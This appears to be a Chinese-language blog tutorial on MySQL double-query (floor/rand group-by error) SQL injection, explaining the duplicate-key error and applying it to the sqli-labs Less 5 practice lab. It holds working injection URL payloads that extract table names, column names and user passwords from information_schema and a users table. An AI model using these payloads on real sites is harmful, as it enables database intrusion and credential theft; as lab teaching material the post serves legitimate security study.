sql注入之双查询注入

发表于 2021-02-15 更新于 2021-03-02

文章迁移～

漏洞产生原因

通过 floor 报错的方法来爆数据的本质是 group by 语句的报错。group by 语句报错的原因是 floor(random(0)_2)的不确定性，即可能为 0 也可能为 1（group by key 的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的 key 时，如果 key 存在于临时表中，则不在临时表中则更新临时表中的数据；如果该 key 不存在于临时表中，则在临时表中插入 key 所在行的数据。group by floor(random(0)_2)出错的原因是 key 是个随机数，检测临时表中 key 是否存在时计算了一下 floor(random(0)_2)可能为 0，如果此时临时表只有 key 为 1 的行不存在 key 为 0 的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时 floor(random(0)_2)结果可能为 1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。

sql 双查询注入一般会用到的几个函数：

  • rand() ： 是一个生成随机数的函数，他会返回 0 到 1 之间到一个值。
  • floor() ： 是取整函数了，童鞋们应该都很熟悉了。
  • count() ： 是一个聚合函数，用户返回符合条件的记录数量。

原理解析：

参考文章：sql 注入–双查询报错注入原理探索

上面的文章讲的比较详细，并且有图作为参考。

常用报错语句为：SELECT count(*),concat((SELECT database()),"~",floor(rand()*2))as a FROM test GROUP BY a;

个人理解： group by 运行的过程中会新建一个虚拟表，而rand()会在插入的过程中再次运行一次，也就是说在一个区分的过程中会运行两次。假设第一次floor(rand()*2)的结果为1, 查询虚拟表中并没有test~1， 则执行插入语句，在虚拟表中插入:test~1 | 1的记录。假设第二次floor(rand()*2)的结果为1， 因为虚拟表中已经存在test~1,所以直接执行更新语句，将虚拟表中的 count(*)结果1更新为2。假设第三次floor(rand()*2)的结果为0, 查询虚拟表并无test~0记录，所以要新建一条记录，在执行插入语句时，由于rand()会再次运行，恰巧此时floor(rand()*2)为1,形成的插入语句在执行过程中因已存在key:test~1，会报错，从而实现报错注入。

实际应用

靶场： sqli-libs less 5

获取表名：?id=1' union select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 2,1), floor(rand()*2)) as a ,3 from information_schema.tables group by a -- ' 。 这里不建议使用group_concat(table_name), 使用后执行多次也没有触发报错，不清楚什么原因。

获取列名：?id=1' union select count(*),concat((select column_name from information_schema.columns where table_name='users' limit 2,1), floor(rand()*2)) as a ,3 from information_schema.tables group by a -- '

获取值：?id=1' union select count(*),concat((select password from users limit 0,1), floor(rand()*2)) as a ,3 from information_schema.tables group by a -- '
